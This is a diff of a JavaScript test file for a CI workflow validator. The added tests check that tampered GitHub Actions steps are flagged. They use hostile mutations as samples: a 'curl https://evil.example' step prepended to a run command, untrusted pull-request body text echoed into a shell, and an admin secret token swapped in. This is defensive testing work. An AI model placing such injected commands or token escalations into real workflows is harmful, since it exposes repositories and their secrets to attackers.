@@ -168,7 +168,7 @@ test('1CL: exact second Github token expression must remain in named read-only C
 test('1CL: duplicate, unreviewed GitHub expression or token escalation denied globally',()=>{
  const expression='$'+'{{ github.token }}';
  const anchor='          GITHUB_READ_TOKEN: '+expression;
- assert.equal(workflow.split(anchor).length-1,2);
+ assert.equal(workflow.split(anchor).length-1,3);
  const bad=[
   workflow.replace('          GITHUB_EXPECTED_PR_HEAD_SHA: '+'$'+'{{ github.event.pull_request.head.sha }}',
    '          GITHUB_EXPECTED_PR_HEAD_SHA: '+'$'+'{{ github.event.pull_request.title }}'),
@@ -178,4 +178,36 @@ test('1CL: duplicate, unreviewed GitHub expression or token escalation denied gl
  ];
  for(const source of bad)
   assert.equal(evaluate({workflow:source}).phase1caBoundedJobScopeConsistent,false);
+});
+
+test('1CN: exact GitHub ruleset observer is immutable and cannot receive admin tokens or shell',()=>{
+ const h='      - name: Phase 1CN actual GitHub main ruleset inventory and hidden bypass actor visibility (HARD HOLD)';
+ const run='        run: node scripts/phase1cn-ruleset-bypass-reconciliation.mjs --ci-hold';
+ assert.ok(workflow.includes(h));
+ assert.ok(workflow.includes(run));
+ assert.equal(evaluate().phase1caBoundedJobScopeConsistent,true,
+  evaluate().phase1caAnomalyCodes.join(','));
+ for(const [from,to] of [
+  [h,h.replace('hidden bypass actor','admin bypass actor')],
+  [run,run.replace('--ci-hold','--apply')],
+  [run,run.replace('node scripts/', 'curl https://evil.example && node scripts/')]
+ ]){
+  const mutated=workflow.replace(from,to);
+  assert.notEqual(mutated,workflow);
+  assert.ok(evaluate({workflow:mutated}).phase1caAnomalyCodes.includes(
+   'CA_UNREVIEWED_PHASE1CN_READONLY_RULESET_STEP_OR_SOURCE_BINDING'));
+ }
+});
+test('1CN: cannot duplicate, move or substitute new read-only Github expression',()=>{
+ const token='          GITHUB_READ_TOKEN: '+'$'+'{{ github.token }}';
+ const replacement=workflow.replace(
+  '        run: node scripts/phase1cn-ruleset-bypass-reconciliation.mjs --ci-hold',
+  '        run: echo '+ '$'+'{{ github.event.pull_request.body }}');
+ assert.equal(evaluate({workflow:replacement}).phase1caBoundedJobScopeConsistent,false);
+ const secret=workflow.replace(token,'          GITHUB_READ_TOKEN: '+'$'+'{{ secrets.ADMIN_PAT }}');
+ assert.ok(evaluate({workflow:secret}).phase1caAnomalyCodes.includes(
+  'CA_UNREVIEWED_GITHUB_EXPRESSION'));
+ const duplicated=workflow.replace(token,token+'\n'+token);
+ assert.ok(evaluate({workflow:duplicated}).phase1caAnomalyCodes.includes(
+  'CA_UNREVIEWED_GITHUB_EXPRESSION'));
 });
